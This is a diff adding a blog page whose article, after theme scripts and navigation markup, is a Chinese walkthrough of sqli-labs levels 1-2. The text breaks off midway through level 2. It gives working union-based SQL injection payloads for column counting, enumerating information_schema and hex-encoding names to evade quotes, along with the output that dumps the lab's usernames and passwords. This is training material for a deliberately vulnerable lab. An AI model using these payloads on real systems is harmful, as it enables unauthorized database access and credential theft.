+        return volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/jquery/dist/jquery.min.js")
+      } else {
+        return new Promise(resolve => {
+          resolve()
+        });
+      }
+    }
+  }
+  /********************** requestAnimationFrame ********************************/
+  // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+  // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+  volantis.requestAnimationFrame = (fn)=>{
+    if (!window.requestAnimationFrame) {
+      window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+    }
+    window.requestAnimationFrame(fn)
+  }
+  /************************ layoutHelper *****************************************/
+  volantis.layoutHelper = (helper, html, opt)=>{
+    opt = Object.assign({clean:false, pjax:true}, opt)
+    function myhelper(helper, html, clean) {
+      volantis.tempDiv = document.createElement("div");
+      volantis.tempDiv.innerHTML = html;
+      let layoutHelper = document.querySelector("#layoutHelper-"+helper)
+      if (layoutHelper) {
+        if (clean) {
+          layoutHelper.innerHTML = ""
+        }
+        layoutHelper.append(volantis.tempDiv);
+      }
+    }
+    myhelper(helper, html, opt.clean)
+    if (opt.pjax) {
+      volantis.pjax.push(()=>{
+        myhelper(helper, html, opt.clean)
+      },"layoutHelper-"+helper)
+    }
+  }
+  /****************************** 滚动事件处理 ****************************************/
+  volantis.scroll = {
+    engine: new RunItem(),
+    unengine: new RunItem(),
+  };
+  volantis.scroll = Object.assign(volantis.scroll, {
+    push: volantis.scroll.engine.push,
+  });
+  // 滚动条距离顶部的距离
+  volantis.scroll.getScrollTop = () =>{
+    let scrollPos;
+    if (window.pageYOffset) {
+      scrollPos = window.pageYOffset;
+    } else if (document.compatMode && document.compatMode != 'BackCompat') {
+      scrollPos = document.documentElement.scrollTop;
+    } else if (document.body) {
+      scrollPos = document.body.scrollTop;
+    }
+    return scrollPos;
+  }
+  // 使用 requestAnimationFrame 处理滚动事件
+  // `volantis.scroll.del` 中存储了一个数值, 该数值检测一定时间间隔内滚动条滚动的位移, 数值的检测频率是浏览器的刷新频率. 数值为正数时, 表示向下滚动. 数值为负数时, 表示向上滚动.
+  volantis.scroll.handleScrollEvents = () => {
+    volantis.scroll.lastScrollTop = volantis.scroll.getScrollTop()
+    function loop() {
+      const scrollTop = volantis.scroll.getScrollTop();
+      if (volantis.scroll.lastScrollTop !== scrollTop) {
+        volantis.scroll.del = scrollTop - volantis.scroll.lastScrollTop;
+        volantis.scroll.lastScrollTop = scrollTop;
+        // if (volantis.scroll.del > 0) {
+        //   console.log("向下滚动");
+        // } else {
+        //   console.log("向上滚动");
+        // }
+        // 注销过期的unengine未滚动事件
+        volantis.scroll.unengine.list=[]
+        volantis.scroll.engine.start();
+      }else{
+        volantis.scroll.unengine.start();
+      }
+      volantis.requestAnimationFrame(loop)
+    }
+    volantis.requestAnimationFrame(loop)
+  }
+  volantis.scroll.handleScrollEvents()
+  // 触发页面滚动至目标元素位置
+  volantis.scroll.to = (ele, option = {}) =>{
+    // 默认配置
+    opt = {
+      top: ele.getBoundingClientRect().top + document.documentElement.scrollTop,
+      behavior: "smooth"
+    }
+    // 定义配置
+    if ("top" in option) {
+      opt.top = option.top
+    }
+    if ("behavior" in option) {
+      opt.behavior = option.behavior
+    }
+    if ("addTop" in option) {
+      opt.top += option.addTop
+    }
+    if (!("observerDic" in option)) {
+      option.observerDic = 100
+    }
+    // 滚动
+    window.scrollTo(opt);
+    // 监视器
+    // 监视并矫正元素滚动到指定位置
+    // 用于处理 lazyload 引起的 cls 导致的定位失败问题
+    // option.observer = false
+    if (option.observer) {
+      setTimeout(()=>{
+        volantis.scroll.unengine.push(()=>{
+          let me = ele.getBoundingClientRect().top
+          if(!(me >= -option.observerDic && me <= option.observerDic)){
+            volantis.scroll.to(ele, option)
+          }
+          volantis.scroll.unengine.remove("unengineObserver")
+        },"unengineObserver")
+      },1000)
+    }
+  }
+  /********************** Content Visibility ********************************/
+  // 见 source/css/first.styl 如果遇到任何问题 删除 .post-story 即可
+  // 一个元素被声明 content-visibility 属性后 如果元素不在 viewport 中 浏览器不会计算其后代元素样式和属性 从而节省 Style & Layout 耗时
+  // content-visibility 的副作用: 锚点失效 等等(实验初期 暂不明确), 使用此方法清除样式
+  volantis.cleanContentVisibility = ()=>{
+    if (document.querySelector(".post-story")) {
+      console.log("cleanContentVisibility");
+      document.querySelectorAll(".post-story").forEach(e=>{
+        e.classList.remove("post-story")
+      })
+    }
+  }
+  /******************************************************************************/
+  /******************************************************************************/
+  /******************************************************************************/
+  //图像加载出错时的处理
+  function errorImgAvatar(img) {
+    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg";
+    img.onerror = null;
+  }
+  function errorImgCover(img) {
+    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg";
+    img.onerror = null;
+  }
+  /******************************************************************************/
+</script>
+
+  <!-- import head_end begin -->
+  <!-- import head_end end -->
+  <!-- Custom Files headEnd begin-->
+  
+  <!-- Custom Files headEnd end-->
+</head>
+  <body itemscope itemtype="http://schema.org/WebPage">
+    <!-- import body_begin begin-->
+    <!-- import body_begin end-->
+    <!-- Custom Files bodyBegin begin-->
+    
+    <!-- Custom Files bodyBegin end-->
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self"  href="/" onclick="return false;" title="comment"></a></li>
+        
+          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self"  href="/" onclick="return false;" title="toc"></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+            <img no-lazy class='logo' src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/" title="博客"
+                  
+                  
+                  
+                    active-action="action-home"
+                  >
+                  <i class='fa-solid fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/" title="分类"
+                  
+                  
+                  
+                    active-action="action-categories"
+                  >
+                  <i class='fa-solid fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/tags/" title="标签"
+                  
+                  
+                  
+                    active-action="action-tags"
+                  >
+                  <i class='fa-solid fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/archives/" title="归档"
+                  
+                  
+                  
+                    active-action="action-archives"
+                  >
+                  <i class='fa-solid fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/friends/" title="友链"
+                  
+                  
+                  
+                    active-action="action-friends"
+                  >
+                  <i class='fa-solid fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/about/" title="关于"
+                  
+                  
+                  
+                    active-action="action-about"
+                  >
+                  <i class='fa-solid fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+      
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fa-solid fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+      
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fa-solid fa-search fa-fw" target="_self" href="/" onclick="return false;" title="search"></a></li>
+				
+				<li>
+          <a class="s-menu fa-solid fa-bars fa-fw" target="_self" href="/" onclick="return false;" title="menu"></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/" title="博客"
+                  
+                  
+                  
+                    active-action="action-home"
+                  >
+                  <i class='fa-solid fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/" title="分类"
+                  
+                  
+                  
+                    active-action="action-categories"
+                  >
+                  <i class='fa-solid fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/tags/" title="标签"
+                  
+                  
+                  
+                    active-action="action-tags"
+                  >
+                  <i class='fa-solid fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/archives/" title="归档"
+                  
+                  
+                  
+                    active-action="action-archives"
+                  >
+                  <i class='fa-solid fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/friends/" title="友链"
+                  
+                  
+                  
+                    active-action="action-friends"
+                  >
+                  <i class='fa-solid fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/about/" title="关于"
+                  
+                  
+                  
+                    active-action="action-about"
+                  >
+                  <i class='fa-solid fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+
+      <!-- Custom Files header begin -->
+      
+      <!-- Custom Files header end -->
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+      <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
+      <div id="none" class='cover-wrapper post dock' style="display: none;">
+        
+  <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
+
+<div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">Volantis</p>
+    
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/v4/getting-started/"
+              
+              
+              active-action="action-v4getting-started">
+              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f5c3.svg'><p>文档</p>
+            </a>
+          
+            <a href="/faqs/"
+              
+              
+              active-action="action-faqs">
+              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f516.svg'><p>帮助</p>
+            </a>
+          
+            <a href="/examples/"
+              
+              
+              active-action="action-examples">
+              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f396.svg'><p>示例</p>
+            </a>
+          
+            <a href="/contributors/"
+              
+              
+              active-action="action-contributors">
+              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f389.svg'><p>社区</p>
+            </a>
+          
+            <a href="/archives/"
+              
+              
+              active-action="action-archives">
+              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f4f0.svg'><p>博客</p>
+            </a>
+          
+            <a target="_blank" rel="noopener" href="https://github.com/volantis-x/hexo-theme-volantis/"
+              
+              
+              active-action="action-https:githubcomvolantis-xhexo-theme-volantis">
+              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f9ec.svg'><p>源码</p>
+            </a>
+          
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+        <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+      </div>
+    
+  
+</div>
+
+      <div id="safearea">
+        <div class="body-wrapper">
+          
+<div id="l_main" class=''>
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/">
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Dr4x3zz">
+  </span>
+  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
+    <meta itemprop="name" content="Dr4x3zz">
+    <meta itemprop="description" content="这是我的专属博客">
+  </span>
+  
+
+
+  
+    <span hidden>
+      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+    </span>
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title" itemprop="name headline">
+        sqli-labs-1-8
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">ChenZhengkai10.</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/sqli-labs/">sqli-labs</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/sqli-labs/" itemprop="url"><span itemprop="name">sqli-labs</span></a>
+      </span>
+    
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-12-21T20:20:08+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Dec 21, 2022</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h2 id="sqli-labs-1-8"><a class="markdownIt-Anchor" href="#sqli-labs-1-8">#</a> sqli-labs-1-8</h2>
+<span id="more"></span>
+<h3 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入">#</a> SQL 注入</h3>
+<h4 id="sql注入常用"><a class="markdownIt-Anchor" href="#sql注入常用">#</a> SQL 注入常用</h4>
+<blockquote>
+<p><strong>information_schema：表示所有信息，包括库、表、列</strong><br>
+<strong> information_schema.tables：记录所有表名信息的表</strong><br>
+<strong> information_schema.columns：记录所有列名信息的表</strong><br>
+<strong> table_schema：数据库的名称</strong><br>
+<strong> table_name: 表名</strong><br>
+<strong> column_name: 列名</strong><br>
+<strong> group_concat (): 显示所有查询到的数据</strong></p>
+</blockquote>
+<h4 id="哪里存在sql注入"><a class="markdownIt-Anchor" href="#哪里存在sql注入">#</a> 哪里存在 SQL 注入？</h4>
+<p><strong>·</strong> <strong>GET</strong><br>
+<strong>·</strong> <strong>POST</strong><br>
+<strong>·</strong> <strong>HTTP 头部注入</strong><br>
+<strong>・</strong> <strong>Cookie 注入</strong></p>
+<h4 id="sql注入的类型"><a class="markdownIt-Anchor" href="#sql注入的类型">#</a> sql 注入的类型</h4>
+<p>1、字符型注入<br>
+ 2、数字型注入</p>
+<h4 id="mysql中3种注释风格"><a class="markdownIt-Anchor" href="#mysql中3种注释风格">#</a> MySQL 中 3 种注释风格</h4>
+<blockquote>
+<p>‘#’ （url 编码为 %23）<br>
+‘–’ （–后边要跟上一个或多个空格 --+）</p>
+</blockquote>
+<h4 id="判断注入点"><a class="markdownIt-Anchor" href="#判断注入点">#</a> 判断注入点</h4>
+<blockquote>
+<p>and 1=1 /and 1=2 回显页面不同（整形判断）<br>
+若在 GET 请求中？id=1 and 1=1 和？id=1 and 1=2 都没有报错，则是字符型注入。<br>
+若在 GET 请求中？id=1 and 1=1 没有报错，但是？id=1 and 1=2 有异常或没回显，则是数字型注入。<br>
+单引号判断 ’ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断）</p>
+</blockquote>
+<h4 id="步骤"><a class="markdownIt-Anchor" href="#步骤">#</a> 步骤</h4>
+<h5 id="1-判断列数"><a class="markdownIt-Anchor" href="#1-判断列数">#</a> 1、判断列数</h5>
+<blockquote>
+<p>order by 1<br>
+order by 2<br>
+…<br>
+order by 70</p>
+</blockquote>
+<h5 id="2-判断显示位"><a class="markdownIt-Anchor" href="#2-判断显示位">#</a> 2、判断显示位</h5>
+<blockquote>
+<p>url?id=-1 union select 1,2,3,4,5</p>
+</blockquote>
+<h5 id="3-获取当数据库名称和当前连接数据库的用户"><a class="markdownIt-Anchor" href="#3-获取当数据库名称和当前连接数据库的用户">#</a> 3、获取当数据库名称和当前连接数据库的用户</h5>
+<blockquote>
+<p>url?id=-1 union select 1,2,databaes(),4,5<br>
+url?id=-1 union select 1,2,user(),4,5</p>
+</blockquote>
+<h5 id="4-列出所有数据库"><a class="markdownIt-Anchor" href="#4-列出所有数据库">#</a> 4、列出所有数据库</h5>
+<blockquote>
+<p><strong>limit 一个一个打印出来库名</strong><br>
+ select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1<br>
+<strong>group_concat 一次性全部显示</strong><br>
+ select group_concat (SCHEMA_NAME) from information_schema.SCHEMATA</p>
+</blockquote>
+<h5 id="5-列出数据库test中所有的表"><a class="markdownIt-Anchor" href="#5-列出数据库test中所有的表">#</a> 5、列出 (数据库：test) 中所有的表</h5>
+<blockquote>
+<p><strong>limit 一个一个打印出来字段名</strong><br>
+ select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=‘test’<br>
+limit 0,1<br>
+<strong>group_concat 一次性全部显示</strong><br>
+ select group_concat (TABLE_NAME) from information_schema.TABLES where<br>
+TABLE_SCHEMA=0x674657374<br>
+ 注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</p>
+</blockquote>
+<h5 id="6-列出数据库test-表admin-中所有的字段"><a class="markdownIt-Anchor" href="#6-列出数据库test-表admin-中所有的字段">#</a> 6、列出（数据库：test 表：admin ）中所有的字段</h5>
+<blockquote>
+<p><strong>limit 一个一个打印出来</strong><br>
+ select COLUMN_NAME from information_schema.COLUMNS where<br>
+TABLE_SCHEMA=‘baji’ and TABLE_NAME=‘users’ limit 0,1<br>
+<strong>group_concat 一次性全部显示</strong><br>
+ select group_concat (COLUMN_NAME) from information_schema.COLUMNS where<br>
+TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</p>
+</blockquote>
+<h5 id="7-列出数据库test-表admin-中的数据"><a class="markdownIt-Anchor" href="#7-列出数据库test-表admin-中的数据">#</a> 7、列出（数据库：test 表：admin ）中的数据</h5>
+<blockquote>
+<p><strong>limit 一个一个打印出来</strong><br>
+ select username,passwd from test.admin limit 0,1<br>
+<strong>group_concat 把 一次性全部打印</strong><br>
+ select group_concat (concat (username,0x20,passwd)) from test.admin<br>
+network</p>
+</blockquote>
+<p>本文参考参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/93498444">https://blog.csdn.net/qq_37133717/article/details/93498444</a></p>
+<h3 id="sqli-labs-1"><a class="markdownIt-Anchor" href="#sqli-labs-1">#</a> sqli-labs-1</h3>
+<p>通过题目的名字 &quot;GET-Error based - Single quotes - String (基于 GET 错误 - 单引号 - 字符串)&quot; 可知，题目是一个单引号引起的字符型</p>
+<p>在 url 后面输入？id=1 and 1=1,url?id=1 1=2 后发现页面正常没有不同，考虑为字符型<br>
+添加单引号后，页面出现</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>可以看到存在’' 包装<br>
+继续在后面添加–+</p>
+<blockquote>
+<p>url?id=1’ --+<br>
+ 发现页面异常，存在单引号的注入问题</p>
+</blockquote>
+<h4 id="用order-by猜解列数"><a class="markdownIt-Anchor" href="#用order-by猜解列数">#</a> 用 order by 猜解列数</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 order 1 --+</span><br></pre></td></tr></table></figure>
+<p>依次使用</p>
+<blockquote>
+<p>order 2<br>
+order 3<br>
+order 4<br>
+<strong> 页面显示 Unknown column ‘4’ in 'order clause’</strong><br>
+说明一共有三个字段</p>
+</blockquote>
+<h4 id="显示回显位"><a class="markdownIt-Anchor" href="#显示回显位">#</a> 显示回显位</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:2<br>
+Your Password:3<br>
+ 得出可显字段为 2 和 3<br>
+ 所以我们查找数据库</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:security<br>
+Your Password:3<br>
+ 得出数据库名称为：security</p>
+</blockquote>
+<h4 id="爆数据"><a class="markdownIt-Anchor" href="#爆数据">#</a> 爆数据</h4>
+<h5 id="查询表名"><a class="markdownIt-Anchor" href="#查询表名">#</a> 查询表名</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:emails,referers,uagents,users<br>
+Your Password:3<br>
+ 得出表名为 emails,referers,uagents,users</p>
+</blockquote>
+<h5 id="查询列明"><a class="markdownIt-Anchor" href="#查询列明">#</a> 查询列明</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password<br>
+Your Password:3<br>
+ 得出列名为 id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password</p>
+</blockquote>
+<h5 id="查询数据"><a class="markdownIt-Anchor" href="#查询数据">#</a> 查询数据</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,username,password from users limit 0,1 --+</span><br></pre></td></tr></table></figure>
+<p><em>这里采用 limit 0,1，因为用 group_concat（）一次爆出多条数据，不方便我们查看相对应的用户名和密码</em></p>
+<p>依次增加 0,1   1,1   2,1   3,1 直至页面无数据显示<br>
+将分别得到的内容整合成一个表，如下：</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Dumb</td>
+<td>Dumb</td>
+</tr>
+<tr>
+<td>Angelina</td>
+<td>I-kill-you</td>
+</tr>
+<tr>
+<td>Dummy</td>
+<td>p@ssword</td>
+</tr>
+<tr>
+<td>secure</td>
+<td>crappy</td>
+</tr>
+<tr>
+<td>stupid</td>
+<td>stupidity</td>
+</tr>
+<tr>
+<td>superman</td>
+<td>genious</td>
+</tr>
+<tr>
+<td>batman</td>
+<td>mob!le</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>admin</td>
+</tr>
+</tbody>
+</table>
+<p>若想直接爆出所有用户名和密码可以这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>
+Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin<br>
+ 按顺序对应各自的 username 和 password</p>
+</blockquote>
+<h2 id="sqli-labs-2"><a class="markdownIt-Anchor" href="#sqli-labs-2">#</a> sqli-labs-2</h2>
+<h4 id="初步判断"><a class="markdownIt-Anchor" href="#初步判断">#</a> 初步判断</h4>
+<p>输入？id=1 得出页面回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:Dumb<br>
+Your Password:Dumb</p>
+</blockquote>
+<p>接着在 url 后添加’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>说明 SQL 语法错误 <strong>‘’ LIMIT 0,1’ at line 1</strong> 显示添加后语法中多了一个’，说明本题不需要闭合<br>
+用 1=1，1=2 判断为字符还是数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=1</span><br><span class="line">url?id=1 and 1=2</span><br></pre></td></tr></table></figure>
+<p>发现 1=2 异常说明本题为数字型注入</p>
+<h4 id="查询列数"><a class="markdownIt-Anchor" href="#查询列数">#</a> 查询列数</h4>
+<p>使用 order</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 order by 1 --+</span><br><span class="line">order by 2</span><br><span class="line">...</span><br><span class="line">url?id=1 and 1=2 order by 4 --+</span><br></pre></td></tr></table></figure>
+<p>这时候页面异常显示</p>
+<blockquote>
+<p>Unknown column ‘4’ in ‘order clause’<br>
+说明只有三列</p>
+</blockquote>
+<h4 id="确定哪个字段有回显"><a class="markdownIt-Anchor" href="#确定哪个字段有回显">#</a> 确定哪个字段有回显</h4>
+<p>使用 union select 联合注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:2<br>
+Your Password:3</p>
+</blockquote>
+<p>得出二三列回显</p>
+<h4 id="确定当前数据库名称"><a class="markdownIt-Anchor" href="#确定当前数据库名称">#</a> 确定当前数据库名称</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:security<br>
+Your Password:3</p>
+</blockquote>
+<p>得出数据库名称为 security</p>
+<h4 id="得出数据库所有表名"><a class="markdownIt-Anchor" href="#得出数据库所有表名">#</a> 得出数据库所有表名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:emails,referers,uagents,users<br>
+Your Password:3</p>
+</blockquote>
+<p>得出数据库的所有表名为<strong> emails,referers,uagents,users</strong></p>
+<h4 id="得出数据库所有列名"><a class="markdownIt-Anchor" href="#得出数据库所有列名">#</a> 得出数据库所有列名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>页面显示</p>
+<blockquote>
+<p>Your Login name:email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username<br>
+Your Password:3</p>
